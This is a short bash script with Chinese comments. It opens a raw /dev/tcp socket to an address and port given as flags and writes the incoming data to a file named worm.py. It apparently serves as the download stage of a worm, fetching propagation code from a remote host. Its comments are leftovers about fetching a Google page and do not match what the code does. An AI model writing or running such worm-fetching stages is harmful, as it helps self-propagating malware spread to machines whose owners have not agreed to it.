#!/bin/bash
while getopts a:p: flag
do
    case "${flag}" in
        a) address=${OPTARG};;
        p) port=${OPTARG};;
    esac
done
# 開啟連線至 Google 網頁的 socket
IP=127.0.0.1
# IP=www.google.com.tw
exec 10<>/dev/tcp/${address}/${port}

# 送出 HTTP 請求
# echo -e "GET / HTTP/1.1\n\n" >&10

# 接收網頁內容，1 秒後自動停止接收資料
timeout 2 cat <&10 > worm.py

# 關閉輸入與輸出 socket
exec 10<&-
exec 10>&-